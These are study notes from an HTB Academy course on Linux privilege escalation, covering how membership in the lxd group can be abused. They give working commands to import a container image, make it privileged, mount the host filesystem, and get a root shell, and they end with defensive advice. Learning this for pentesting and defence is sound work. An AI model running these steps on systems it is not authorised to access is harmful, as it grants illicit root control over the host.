# Linux Privilege Escalation — Containers (LXC/LXD)

**Module:** HTB Academy (Linux Privilege Escalation track)

---

## Containers vs. VMs

- **Containers** operate at the **OS level** — share the host's kernel, isolate application processes.
- **VMs** (classic virtualization) operate at the **hardware level** — run multiple full OS instances simultaneously.
- Isolation/virtualization exist to manage resources and security efficiently: easier error monitoring, isolating processes that would otherwise need root (e.g., a web app/API kept separate from the host to prevent escalation into databases).

---

## Linux Containers (LXC)

- OS-level virtualization: multiple Linux systems run isolated from each other on one host, each with its own processes but **sharing the host kernel**.
- Lower resource consumption than VMs; standard interface for managing many containers at once.
- Portable across clouds — consistent setup from container creation → OS/network config → app deployment.
- **Docker** built its ecosystem on top of this same underlying LXC concept, driving its massive adoption.

---

## Linux Daemon (LXD)

- Similar concept to LXC, but designed to contain a **complete operating system** — a **system container**, not just an application container.

### Prerequisite: Group Membership

- To exploit LXC/LXD for privesc, the current user must be in the **`lxc`** or **`lxd`** group.

```bash
id
# uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

---

## Exploitation Approaches

- Two main paths:
  1. Create your own container and transfer it to the target.
  2. **Use an existing container image already on the system** (often found in admin-created template directories).

### Why Existing Templates Are Risky

- Admins often use templates with **little to no security** (no passwords, no hardening) — meant to be quick/simple test environments.
- A security-hardened setup would slow down the whole container-initiation workflow, so many templates skip it entirely.

### Step 1 — Find & Import an Existing Template

```bash
cd ContainerImages
ls
# ubuntu-template.tar.xz

lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```

```
ALIAS               FINGERPRINT   TYPE        SIZE
ubuntu/18.04        623c9f0bde47  CONTAINER   106.49MB
```

### Step 2 — Initialize with Privileged Flag + Host Root Mount

```bash
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

- **`security.privileged=true`** → disables container isolation features, allowing actions on the **host**.
- **`disk source=/ path=/mnt/root`** → mounts the **entire host filesystem** into the container at `/mnt/root`.

### Step 3 — Start & Access

```bash
lxc start privesc
lxc exec privesc /bin/bash
```

```
root@nix02:~# ls -l /mnt/root
# shows the full host filesystem: bin, etc, home, root, var, etc.
```

- Because the container runs **privileged**, the shell inside it is effectively **root on the host** — the mounted `/mnt/root` gives full read/write access to the host's filesystem as root.

---

## Key Takeaways

- Membership in the **`lxc`/`lxd`** group is the only prerequisite — check for it early (`id` command) when enumerating a Linux target.
- The core privesc mechanism: **import or use any available container image → initialize it with `security.privileged=true` → bind-mount the host's `/` into the container**. A privileged container has no real isolation from the host, so this effectively grants root.
- Watch for **leftover/default container template files** (e.g., `.tar.xz` images) sitting in user-accessible directories — they're a strong signal this attack path is available, especially if they lack passwords/hardening.
- Defense: restrict `lxc`/`lxd` group membership to trusted admins only; avoid using `security.privileged=true` on containers accessible to lower-privileged users; audit container image sources before import.
